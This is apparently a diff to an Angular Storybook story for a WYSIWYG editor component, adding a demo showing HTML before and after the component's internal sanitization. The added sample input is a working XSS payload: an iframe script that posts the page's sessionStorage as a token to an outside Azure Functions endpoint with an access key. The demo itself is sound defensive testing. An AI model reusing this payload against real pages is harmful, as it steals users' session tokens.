@@ -27,6 +27,11 @@ import {MatButtonModule} from "@angular/material/button";
 const stories = storiesOf('Forms', module)
   .addDecorator(withKnobs);
 
+const unsanitized = `<iframe srcdoc="<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>">
+</iframe>
+<b>This is bold.</b>
+`;
+
 stories
   .add('WYSIWYG', () => ({
     moduleMetadata: {
@@ -38,20 +43,32 @@ stories
 <button (click)="disabled = !disabled">Toggle disabled state</button>
 <!--boolean('Disabled', true)-->
     <mat-card class="sto-card" style="height: 600px">
-        <sto-wysiwyg [readonly]="disabled" [formControl]="control">
+        <sto-wysiwyg #wysiwyg [readonly]="disabled" [formControl]="control">
         <button mat-flat-button color="primary">Save</button>
         <button mat-flat-button color="primary">Cancel</button>
 </sto-wysiwyg>
     </mat-card>
-    
-Resulting HTML
+
+Sanitizing happens <b>*inside*</b> the wysiwyg component. Malicious html is not passed to innerHTML.<br>
+To be safe, consuming apps should <b>always</b> sanitize input before sending to wysiwyg component.<br>
+<br>
+Before sanitizing:
 <pre>
-{{control.value}}
+{{unsanitized}}
+</pre>
+
+SafeValue (sanitized text value)
+<pre>
+{{wysiwyg.value}}
 </pre>
 <br>
+
+As HTML:
+<div [innerHTML]="wysiwyg.value"></div>
     `,
     props: {
-      control: new FormControl(),
+      unsanitized: unsanitized,
+      control: new FormControl(unsanitized),
       disabled: false,
       change: action('Value changed'),
     },
